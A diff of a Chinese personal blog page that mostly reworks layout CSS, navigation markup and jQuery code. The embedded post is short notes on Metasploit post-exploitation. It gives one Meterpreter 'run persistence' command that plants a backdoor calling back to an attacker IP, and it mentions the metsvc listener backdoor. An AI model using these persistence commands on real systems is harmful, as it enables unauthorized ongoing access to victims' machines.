@@ -1,5 +1,5 @@
 <html>
-    <head>
+<head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
     <title>向死而生 | 吾于此生，竭尽所能</title>
@@ -10,118 +10,26 @@
 <link rel="stylesheet" href="../style.css">
 
 <meta name="generator" content="Hexo 5.4.0"></head>
-<!--  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/default.min.css">    -->  
 
 <link rel="stylesheet" href="../markdown.css">
 
+
+<link rel="stylesheet" href="../content.css">
+
     <style>
-        .content{
-            line-height: 1.5;
-            color: rgb(0, 0, 0);
-            border: 0;
-            background-color: rgba(255, 255, 255, 0.70);
-            max-width: 896px;
-            padding: 0 2px;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.65);
-            padding: 0 27px 27px;
-            overflow: auto;
-            font-size: 1.125em
-        }
-        #title{
-            line-height: 2;
-            color: #333;
-            margin: 27px 0 0 0;
-            padding: 0;
-            border: 0;
-            outline: 0;
-            font-size: 2.7em;
-        }
-        #nav{
-            line-height: 1.5;
-            color: #333;
-            display: flex;
-            justify-content: flex-end;
+        #nav_list a:hover{
+            background-color: #555;
+            color: #999;
         }
         .nav_item{
             line-height: 1.5;
             margin: 0;
             border: 0;
-            outline: 0;
             color: #333;
-            padding: 14px 20px;
+            padding: 16px 20px;
             display: block;
             background-color: rgba(119, 119, 255,0);
-        }
-        #nav_center{
-            line-height: 1.5;
-            color: #333;
-            padding: 0 10vw 0 10vw;
-            border: 0;
-            outline: 0;
-            margin: 0 auto;
-            line-height: 1.5;
-            color: #333;
-            outline: none;
-            position: fixed;
-            top: 0;
-            height: 3.5em;
-            width: 80vw;
-            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.65);
-            background-color: rgba(255, 255, 255, 0.70);
-        }
-        #main{
-            margin: 80px auto;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content:center;
-        }
-        #sidebar{
-            width: 36%;
-            max-width: 360px;
-        }
-        .content{
-            border-radius: 27px;
-            margin: 0 20px 0 20px;
-/*            min-width: 896px; */
-        }
-        .sidebar_item{
-            margin-bottom: 50px;
-            padding: 30px;
-            border-radius: 15px;
-        }
-/*         .highlight{
-            background: #2d2d2d;
-            margin: 0 -20px;
-            padding: 15px 20px;
-            border-style: solid;
-            border-color: #ddd;
-            border-width: 1px 0;
-            overflow: auto;
-            color: #ABB2BF;
-            line-height: 22px;
-        } */
-        .sidebar_title{
-            line-height: 1.5;
-            box-sizing: border-box;
-            font-size: 1.2em;
-            font-weight: bold;
-            margin: -10px 0 10px -10px;
-            color: #be7e4a;
-        }
-        #date{
-            line-height: 1.15;
-            box-sizing: border-box;
             transition: all .35s ease-out;
-            word-wrap: break-word;
-            background-color: rgba(255,78,106,0.3);
-            color: #ff4e4e;
-            border-radius: 20px;
-            padding: 10px 18px;
-            font-size: 14px;
-            display: inline-block;
-            margin-bottom: 5px;
-            margin-right: 10px;
-            text-decoration: none;
         }
         .hide_nav_button{
             width: 100%;
@@ -140,40 +48,24 @@
         <div class='background' id='background'></div>
         <!-- 背景遮罩层 -->
         <div class='background' id='background_mask'></div>
-        <!-- 博客标题 -->
-        <div id='side_title' style='
-        position: fixed;
-        top: 0;
-        z-index: 1;
-        margin: 3px 0px 0px 3vw;
-        '>
-            <span style='font-size: 30;'>向死而生</span>
-            <span>吾于此生,竭尽所能</span>
-        </div>
         <!-- 导航栏 -->
-        <div id='nav_center'>
-                <div id='nav'>
-                    <a class='nav_item' href='/'>首页</a>
-                    <a class='nav_item' href='/friends/'>友人帐</a>
-                    <a class='nav_item' href='/about/'>关于我</a>
-                </div>
+        <div id='nav'>
+            <!-- 博客标题 -->
+            <div id='title' style=''>
+                <span style='font-size: 30;'>向死而生</span>
+                <span>吾于此生,竭尽所能</span>
+            </div>
+            <!-- 导航按钮 -->
+            <div id='nav_list'>
+                <a class='nav_item' href='/'>首页</a>
+                <a class='nav_item' href='/friends/'>友人帐</a>
+                <a class='nav_item' href='/about/'>关于我</a>
+            </div>
         </div>
-        <!--隐藏导航栏-->
-        <div id='hide_nav' style='
-            display: none;
-            position: fixed;
-            left: 0;
-            top: 0;
-            width:100vw;
-        '>
-            <!--切换按钮-->
-            <a id='hide_nav_sub' style='
-                position: absolute;
-                width: 2em;
-                height: 3em;
-                right: 1em;
-                top: 0.7em;
-            '>
+        <!-- 手机端导航栏 -->
+        <div id='hide_nav'>
+            <!--收放按钮-->
+            <a id='hide_nav_sub'>
                 <span href='#' style='background-color: #7f8c8d;display: block;width: 2em;height: 3px;border-radius: 1px;margin-top: 6px;'></span>
                 <span href='#' style='background-color: #7f8c8d;display: block;width: 2em;height: 3px;border-radius: 1px;margin-top: 6px;'></span>
                 <span href='#' style='background-color: #7f8c8d;display: block;width: 2em;height: 3px;border-radius: 1px;margin-top: 6px;'></span>
@@ -181,25 +73,20 @@
             <!--内容-->
             <div style='height: 3.5em;'><!--占位符--></div>
             <div id='hide_nav_list' style='
-                display: none;
-                width: 100%;
-                height: 5em;
-                background-color: rgba(88, 88, 88, 0.85);
+
             '>
                 <a href='/' style="color: rgb(240, 240, 240);" class='hide_nav_button'>首页</a>
                 <a href='/friends/' style="color: rgb(240, 240, 240);" class='hide_nav_button'>友人帐</a>
                 <a href='/about/' style="color: rgb(240, 240, 240);" class='hide_nav_button'>关于我</a>
             </div>
         </div>
-        <!-- 主体 -->
-        <div id='main'>
-            <!--文章-->
-            <div class='content'>
-                <p id='title'>msf木马实用操作</p>
-                <div id='date'>2021-08-02</div>
-                <hr>
-                <div id='article'>
-                    <p>后渗透阶段的简单笔记….TBC</p>
+        <!--文章-->
+        <div id='article'>
+            <p id='title'>msf木马实用操作</p>
+            <div id='date'>2021-08-02</div>
+            <hr>
+            <div id='markdown'>
+                <p>后渗透阶段的简单笔记….TBC</p>
 <span id="more"></span>
 
 <ul>
@@ -212,46 +99,27 @@
 <p>例子:<br><code>run persistence -S -U -X -i 5 -p 6666 -r 192.168.190.141</code><br>注意,这个脚本生成的木马 <em>貌似/好像/大概/也许</em> 是一个16位的程序…最高也只能在32位系统里运行,<br>对于64位系统,可以自行再生成一个msf木马upload到靶机上去,一般情况下,其木马所在位置会在执行这个脚本时输出</p>
 <h3 id="权限维持俩脚本之metsvc"><a href="#权限维持俩脚本之metsvc" class="headerlink" title="权限维持俩脚本之metsvc"></a>权限维持俩脚本之metsvc</h3><p>emmm,我不是很推荐用这个,这个脚本不是反向连接的,会在目标机上监听一个端口,随便一个谁去连接都是直接拿到权限,包括各种安全扫描工具…..</p>
 
-                </div>
-                <br><br><br>
-                <script src="https://giscus.app/client.js"
-                    data-repo="smyhw/blog.smyhw.online"
-                    data-repo-id="MDEwOlJlcG9zaXRvcnkzODYyODg2MDg="
-                    data-category="Announcements"
-                    data-category-id="DIC_kwDOFwZL4M4B-hYs"
-                    data-mapping="pathname"
-                    data-reactions-enabled="1"
-                    data-emit-metadata="0"
-                    data-theme="light"
-                    crossorigin="anonymous"
-                    async>
-                </script>
             </div>
-            <!--侧边栏-->
-            <div id='sidebar'>
-                <div id='smyhw_int' class='content sidebar_item' style='
-                    display: flex;
-                    flex-direction: column;
-                    justify-content: center;
-                '>
-                    <img style='margin: 0px 75px 10px;  max-width: 150px;' src='/images/awa.png'>
-                    <hr>
-                    <p style='margin:0 auto;font-size: 2em;'>smyhw</p>
-                    <hr>
-                    <p style='margin:0 auto;'>大概已经是一条咸鱼了qwq...</p>
-                </div>
-                <div class='content sidebar_item'>
-                    <p class='sidebar_title'>页面</p>
-                    <a target="_blank"  href='/friends/'>友人帐</a><br>
-                    <a target="_blank"  href='/about/'>关于我</a><br>
-                    <a target="_blank"  href=''></a><br>
-                    <a target="_blank"  href=''></a><br>
-                </div>
-                <div class='content sidebar_item'>我也不知道该放什么[・ヘ・?]<br>就放个占位符好了(｀・ω・´)
-                
-                </div>
-            </div>
+            <br><br><br>
+            <!-- 评论 -->
+            <script src="https://giscus.app/client.js"
+                data-repo="smyhw/blog.smyhw.online"
+                data-repo-id="MDEwOlJlcG9zaXRvcnkzODYyODg2MDg="
+                data-category="Announcements"
+                data-category-id="DIC_kwDOFwZL4M4B-hYs"
+                data-mapping="pathname"
+                data-reactions-enabled="1"
+                data-emit-metadata="0"
+                data-theme="light"
+                crossorigin="anonymous"
+                async>
+            </script>
         </div>
+        <!-- 侧边栏
+        <div id='sidebar' style="display: none;">
+            咱也不知道这里该放点啥了qwq
+        </div>
+        -->
         <div id='footer' style='
     display: flex;
     position: fixed;
@@ -290,56 +158,7 @@
             $(window).resize(function(){ref();});
             ref();
         })();
-
-        //侧边栏滚动
-        $(window).scroll(function(){
-            var tar = $(document).scrollTop();
-            if(document.body.clientWidth>1330){
-                $('#smyhw_int').animate({marginTop:tar},1);
-            }
-        });
-        //导航栏按钮
-        $('.nav_item').hover(
-            function(){
-                function get_a(target){
-                    tmp3 = $(target).css('background-color');
-                    tmp3 = tmp3.replace('\(','');
-                    tmp3 = tmp3.replace('\)','');
-                    tmp3 = tmp3.replace('rgba','');
-                    tmp2 = tmp3.split(',');
-                    if(isNaN(tmp2[3])){return 1;}
-                    return parseFloat(tmp2[3]);
-                }
-                var tmp1 = function do_it(target,num){
-                    if(get_a(target).toFixed(2) != num.toFixed(2)){return;}
-                    num = num+0.01;
-            //        num = num.toFixed(2);
-                    target.css('background-color','rgba(250,168,255,'+num+')');
-                    setTimeout(function(){tmp1(target,num)},1);
-                }
-                tmp1($(this),get_a($(this)));
-            },
-            function(){
-                function get_a(target){
-                    tmp3 = $(target).css('background-color');
-                    tmp3 = tmp3.replace('\(','');
-                    tmp3 = tmp3.replace('\)','');
-                    tmp3 = tmp3.replace('rgba','');
-                    tmp2 = tmp3.split(',');
-                    if(isNaN(tmp2[3])){return 1;}
-                    return parseFloat(tmp2[3]);
-                }
-                var tmp1 = function do_it(target,num){
-                    if(get_a(target).toFixed(2) != num.toFixed(2)){return;}
-                    num = num-0.01;
-            //        num = num.toFixed(2);
-                    target.css('background-color','rgba(250,168,255,'+num+')');
-                    setTimeout(function(){tmp1(target,num)},1);
-                }
-                tmp1($(this),get_a($(this)));
-            }
-        );
-        //隐藏导航栏按钮
+        //手机导航栏收放按钮
         $('#hide_nav_sub').click(function(){
             if($('#hide_nav_list').css('display')=='none'){
                 $('#hide_nav_list').show();
